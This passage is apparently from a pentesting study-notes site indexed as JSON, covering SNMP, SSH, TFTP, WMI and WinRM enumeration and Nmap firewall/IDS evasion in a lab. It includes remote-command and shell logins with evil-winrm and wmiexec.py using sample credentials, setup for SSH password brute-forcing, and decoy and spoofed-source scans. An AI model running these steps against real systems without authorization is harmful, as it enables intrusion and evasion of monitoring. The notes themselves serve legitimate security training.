<p>Once again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Protocol%20overview/","title":"Protocol overview","text":"<p><code>Simple Network Management Protocol</code> (SNMP) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is <code>SNMPv3</code>, which increases the security of SNMP in particular, but also the complexity of using this protocol.</p> <p>In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port <code>161</code>. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called <code>traps</code> over UDP port <code>162</code>. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.</p> <p>For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Protocol%20overview/#mib","title":"MIB","text":"<p>To ensure that SNMP access works across manufacturers and with different client-server combinations, the <code>Management Information Base</code> (<code>MIB</code>) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one <code>Object Identifier</code> (<code>OID</code>), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the <code>Abstract Syntax Notation One</code> (<code>ASN.1</code>) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Protocol%20overview/#oid","title":"OID","text":"<p>An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the Object Identifier Registry.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Protocol%20overview/#snmpv1","title":"SNMPv1","text":"<p>SNMP version 1 (<code>SNMPv1</code>) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has <code>no built-in authentication</code> mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it <code>does not support encryption</code>, meaning that all data is sent in plain text and can be easily intercepted.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Protocol%20overview/#snmpv2","title":"SNMPv2","text":"<p>SNMPv2 existed in different versions. The version still exists today is <code>v2c</code>, and the extension <code>c</code> means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the <code>community string</code> that provides security is only transmitted in plain text, meaning it has no built-in encryption.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Protocol%20overview/#snmpv3","title":"SNMPv3","text":"<p>The security has been increased enormously for <code>SNMPv3</code> by security features such as <code>authentication</code> using username and password and transmission <code>encryption</code> (via <code>pre-shared key</code>) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than <code>v2c</code>.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Protocol%20overview/#community-strings","title":"Community Strings","text":"<p>Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using <code>SNMPv2</code>, as the transition to <code>SNMPv3</code> can be very complex, but the services still need to remain active. This causes many administrators a great deal of concern and creates some problems they are keen to avoid. The lack of knowledge about how the information can be obtained and how we as attackers use it makes the administrators' approach seem inexplicable. At the same time, the lack of encryption of the data sent is also a problem. Because every time the community strings are sent over the network, they can be intercepted and read.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:</p> Setting Description <code>PasswordAuthentication yes</code> Allows password-based authentication. <code>PermitEmptyPasswords yes</code> Allows the use of empty passwords. <code>PermitRootLogin yes</code> Allows to log in as the root user. <code>Protocol 1</code> Uses an outdated version of encryption. <code>X11Forwarding yes</code> Allows X11 forwarding for GUI applications. <code>AllowTcpForwarding yes</code> Allows forwarding of TCP ports. <code>PermitTunnel</code> Allows tunneling. <code>DebianBanner yes</code> Displays a specific banner when logging in. <p>Allowing password authentication allows us to brute-force a known username for possible passwords. Many different methods can be used to guess the passwords of users. For this purpose, specific <code>patterns</code> are usually used to mutate the most commonly used passwords and, frighteningly, correct them. This is because we humans are lazy and do not want to remember complex and complicated passwords. Therefore, we create passwords that we can easily remember, and this leads to the fact that, for example, numbers or characters are added only at the end of the password. Believing that the password is secure, the mentioned patterns are used to guess precisely such \"adjustments\" of these passwords. However, some instructions and hardening guides can be used to harden our SSH servers.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Default%20Configuration/","title":"Default Configuration","text":"<p>The sshd_config file, responsible for the OpenSSH server, has only a few of the settings configured by default. However, the default configuration includes X11 forwarding, which contained a command injection vulnerability in version 7.2p1 of OpenSSH in 2016. Nevertheless, we do not need a GUI to manage our servers.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Default%20Configuration/#default-configuration","title":"Default Configuration","text":"<p>Linux Remote Management Protocols</p> <pre><code>arenwald@htb[/htb]$ cat /etc/ssh/sshd_config  | grep -v \"#\" | sed -r '/^\\s*$/d'\n\nInclude /etc/ssh/sshd_config.d/*.conf\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem       sftp    /usr/lib/openssh/sftp-server\n</code></pre> <p>Most settings in this configuration file are commented out and require manual configuration.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>One of the tools we can use to fingerprint the SSH server is ssh-audit. It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Footprinting%20the%20Service/#ssh-audit","title":"SSH-Audit","text":"<pre><code>arenwald@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit\narenwald@htb[/htb]$ ./ssh-audit.py 10.129.14.132\n\n# general\n(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\n(gen) software: OpenSSH 8.2p1\n(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+\n(gen) compression: enabled (zlib@openssh.com)                                   \n\n# key exchange algorithms\n(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76                            \n(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4\n(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73\n(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3\n(kex) diffie-hellman-group14-sha256         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73\n\n# host-key algorithms\n(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2\n(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2\n(key) ssh-rsa (3072-bit)                    -- [fail] using weak hashing algorithm\n                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28\n                                            `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2\n(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves\n                                            `- [warn] using weak random number generator could reveal the key\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5\n...SNIP...\n</code></pre> <p>The first thing we can see in the first few lines of the output is the banner that reveals the version of the OpenSSH server. The previous versions had some vulnerabilities, such as CVE-2020-14145, which allowed the attacker the capability to Man-In-The-Middle and attack the initial connection attempt. The detailed output of the connection setup with the OpenSSH server can also often provide important information, such as which authentication methods the server can use.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Footprinting%20the%20Service/#change-authentication-method","title":"Change Authentication Method","text":"<pre><code>arenwald@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132\n\nOpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020\ndebug1: Reading configuration data /etc/ssh/ssh_config \n...SNIP...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\n</code></pre> <p>For potential brute-force attacks, we can specify the authentication method with the SSH client option <code>PreferredAuthentications</code>.</p> <pre><code>arenwald@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password\n\nOpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020\ndebug1: Reading configuration data /etc/ssh/ssh_config\n...SNIP...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\ndebug1: Next authentication method: password\n\ncry0l1t3@10.129.14.132's password:\n</code></pre> <p>Even with this obvious and secure service, we recommend setting up our own OpenSSH server on our VM, experimenting with it, and familiarizing ourselves with the different settings and options.</p> <p>We may encounter various banners for the SSH server during our penetration tests. By default, the banners start with the version of the protocol that can be applied and then the version of the server itself. For example, with <code>SSH-1.99-OpenSSH_3.9p1</code>, we know that we can use both protocol versions SSH-1 and SSH-2, and we are dealing with OpenSSH server version 3.9p1. On the other hand, for a banner with <code>SSH-2.0-OpenSSH_8.2p1</code>, we are dealing with an OpenSSH version 8.2p1 which only accepts the SSH-2 protocol version.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Overview/","title":"Overview","text":"<p>Secure Shell (<code>SSH</code>) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port <code>TCP 22</code>. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known OpenBSD SSH (<code>OpenSSH</code>) server on Linux distributions is an open-source fork of the original and commercial <code>SSH</code> server from SSH Communication Security. Accordingly, there are two competing protocols: <code>SSH-1</code> and <code>SSH-2</code>.</p> <p><code>SSH-2</code>, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, <code>SSH-1</code> is vulnerable to <code>MITM</code> attacks, whereas SSH-2 is not.</p> <p>We can imagine that we want to manage a remote host. This can be done via the command line or GUI. Besides, we can also use the SSH protocol to send commands to the desired system, transfer files, or do port forwarding. Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:</p> <ol> <li>Password authentication</li> <li>Public-key authentication</li> <li>Host-based authentication</li> <li>Keyboard authentication</li> <li>Challenge-response authentication</li> <li>GSSAPI authentication</li> </ol> <p>We will take a closer look at and discuss one of the most commonly used authentication methods. In addition, we can learn more about the other authentication methods here among others.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SSH%20%2822%29/Public%20Key%20Authentication/","title":"Public Key Authentication","text":"<p>In a first step, the SSH server and client authenticate themselves to each other. The server sends a certificate to the client to verify that it is the correct server. Only when contact is first established is there a risk of a third party interposing itself between the two participants and thus intercepting the connection. Since the certificate itself is also encrypted, it cannot be imitated. Once the client knows the correct certificate, no one else can pretend to make contact via the corresponding server.</p> <p>After server authentication, however, the client must also prove to the server that it has access authorization. However, the SSH server is already in possession of the encrypted hash value of the password set for the desired user. As a result, users have to enter the password every time they log on to another server during the same session. For this reason, an alternative option for client-side authentication is the use of a public key and private key pair.</p> <p>The private key is created individually for the user's own computer and secured with a passphrase that should be longer than a typical password. The private key is stored exclusively on our own computer and always remains secret. If we want to establish an SSH connection, we first enter the passphrase and thus open access to the private key.</p> <p>Public keys are also stored on the server. The server creates a cryptographic problem with the client's public key and sends it to the client. The client, in turn, decrypts the problem with its own private key, sends back the solution, and thus informs the server that it may establish a legitimate connection. During a session, users only need to enter the passphrase once to connect to any number of servers. At the end of the session, users log out of their local machines, ensuring that no third party who gains physical access to the local machine can connect to the server.</p>","tags":["Pentesting","Information_Gathering","SSH"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/TFTP%20%2869%29/Service%20information/","title":"Service information","text":"<p><code>Trivial File Transfer Protocol</code>\u00a0(<code>TFTP</code>) is simpler than FTP and performs file transfers between client and server processes. However, it\u00a0<code>does not</code>\u00a0provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses\u00a0<code>UDP</code>, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.</p> <p>This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user's authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.</p> <p>Let us take a look at a few commands of\u00a0<code>TFTP</code>:</p> Commands Description <code>connect</code> Sets the remote host, and optionally the port, for file transfers. <code>get</code> Transfers a file or set of files from the remote host to the local host. <code>put</code> Transfers a file or set of files from the local host onto the remote host. <code>quit</code> Exits tftp. <code>status</code> Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on. <code>verbose</code> Turns verbose mode, which displays additional information during file transfer, on or off. <p>Unlike the FTP client,\u00a0<code>TFTP</code>\u00a0does not have directory listing functionality.</p>","tags":["Pentesting","Information_Gathering","TFTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/WMI%20%28135%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>The initialization of the WMI communication always takes place on <code>TCP</code> port <code>135</code>, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program wmiexec.py from the Impacket toolkit can be used for this.</p>","tags":["Pentesting","Information_Gathering","WMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/WMI%20%28135%29/Footprinting%20the%20Service/#wmiexecpy","title":"WMIexec.py","text":"<pre><code>arenwald@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\nILF-SQL-01\n</code></pre> <p>Again, it is necessary to mention that the knowledge gained from installing these services and playing around with the configurations on our own Windows Server VM for gaining experience and developing the functional principle and the administrator's point of view cannot be replaced by reading manuals. Therefore, we strongly recommend setting up your own Windows Server, experimenting with the settings, and scanning these services repeatedly to see the differences in the results.</p>","tags":["Pentesting","Information_Gathering","WMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/WMI%20%28135%29/Overview/","title":"Overview","text":"<p>Windows Management Instrumentation (<code>WMI</code>) is Microsoft's implementation and also an extension of the Common Information Model (<code>CIM</code>), core functionality of the standardized Web-Based Enterprise Management (<code>WBEM</code>) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (<code>WMIC</code>). WMI is not a single program but consists of several programs and various databases, also known as repositories.</p>","tags":["Pentesting","Information_Gathering","WMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/WinRM%20%285985%2C5986%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>As we already know, WinRM uses TCP ports <code>5985</code> (<code>HTTP</code>) and <code>5986</code> (<code>HTTPS</code>) by default, which we can scan using Nmap. However, often we will see that only HTTP (<code>TCP 5985</code>) is used instead of HTTPS (<code>TCP 5986</code>).</p>","tags":["Pentesting","Information_Gathering","WinRM"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/WinRM%20%285985%2C5986%29/Footprinting%20the%20Service/#nmap-winrm","title":"Nmap WinRM","text":"<pre><code>arenwald@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET\nNmap scan report for 10.129.201.248\nHost is up (0.030s latency).\n\nPORT     STATE SERVICE VERSION\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.34 seconds\n</code></pre> <p>If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The Test-WsMan cmdlet is responsible for this, and the host's name in question is passed to it. In Linux-based environments, we can use the tool called evil-winrm, another penetration testing tool designed to interact with WinRM.</p> <pre><code>arenwald@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Cry0l1t3\\Documents&gt;\n</code></pre>","tags":["Pentesting","Information_Gathering","WinRM"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/WinRM%20%285985%2C5986%29/Overview/","title":"Overview","text":"<p>The Windows Remote Management (<code>WinRM</code>) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (<code>SOAP</code>) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on <code>TCP</code> ports <code>5985</code> and <code>5986</code> for communication, with the last port <code>5986 using HTTPS</code>, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.</p> <p>Another component that fits WinRM for administration is Windows Remote Shell (<code>WinRS</code>), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.</p> <p>Services like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the <code>Windows Server 2012</code> version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.</p>","tags":["Pentesting","Information_Gathering","WinRM"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Firewall%2C%20IDS%20and%20IPS%20Evasion/","title":"Firewall, IDS and IPS Evasion","text":"SWITCH *EXAMPLE* *DESCRIPTION* -f nmap 192.168.1.1 -f Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters -mtu nmap 192.168.1.1 -mtu 32 Set your own offset size -D nmap -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1 Send scans from spoofed IPs -D nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip Above example explained -S nmap -S www.microsoft.com www.facebook.com Scan from different source IP or domain name like Facebook from Microsoft (-e eth0 -Pn may be required) -g nmap -g 53 192.168.1.1 Use given source port number -proxies nmap -proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1 Relay connections through HTTP/SOCKS4 proxies -data-length nmap -data-length 200 192.168.1.1 Appends random data to sent packets Example IDS Evasion command <p>nmap -f -t 0 -n -Pn --data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1</p>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Firewall%2C%20IDS%20and%20IPS%20Evasion/#scan-by-using-decoys","title":"Scan by Using Decoys","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST\nSENT (0.0378s) TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0378s) TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nRCVD (0.1370s) TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.099s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Firewall%2C%20IDS%20and%20IPS%20Evasion/#testing-firewall-rule","title":"Testing Firewall Rule","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p445 -O\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:23 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.032s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 3.14 seconds\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Firewall%2C%20IDS%20and%20IPS%20Evasion/#scan-by-using-different-source-ip","title":"Scan by Using Different Source IP","text":"<p>Firewall and IDS/IPS Evasion</p> <p><pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.010s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n</code></pre> \\</p>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Firewall%2C%20IDS%20and%20IPS%20Evasion/#dns-proxying","title":"DNS Proxying","text":"<p>By default,\u00a0<code>Nmap</code>\u00a0performs a reverse DNS resolution unless otherwise specified to find more important information about our target. These DNS queries are also passed in most cases because the given web server is supposed to be found and visited. The DNS queries are made over the\u00a0<code>UDP port 53</code>. The\u00a0<code>TCP port 53</code>\u00a0was previously only used for the so-called \"<code>Zone transfers</code>\" between the DNS servers or data transfer larger than 512 bytes. More and more, this is changing due to IPv6 and DNSSEC expansions. These changes cause many DNS requests to be made via TCP port 53.</p> <p>However,\u00a0<code>Nmap</code>\u00a0still gives us a way to specify DNS servers ourselves (<code>--dns-server &lt;ns&gt;,&lt;ns&gt;</code>). This method could be fundamental to us if we are in a demilitarized zone (<code>DMZ</code>). The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network. As another example, we can use\u00a0<code>TCP port 53</code>\u00a0as a source port (<code>--source-port</code>) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.</p>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Firewall%2C%20IDS%20and%20IPS%20Evasion/#syn-scan-of-a-filtered-port","title":"SYN-Scan of a Filtered Port","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 22:50 CEST\nSENT (0.0417s) TCP 10.10.14.2:33436 &gt; 10.129.2.28:50000 S ttl=41 id=21939 iplen=44  seq=736533153 win=1024 &lt;mss 1460&gt;\nSENT (1.0481s) TCP 10.10.14.2:33437 &gt; 10.129.2.28:50000 S ttl=46 id=6446 iplen=44  seq=736598688 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT      STATE    SERVICE\n50000/tcp filtered ibm-db2\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","Nmap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Tools/Nmap/Firewall%2C%20IDS%20and%20IPS%20Evasion/#syn-scan-from-dns-port","title":"SYN-Scan From DNS Port","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\n\nSENT (0.0482s) TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 &lt;mss 1460&gt;\nRCVD (0.0608s) TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 &lt;mss 1460&gt;\nNmap scan report 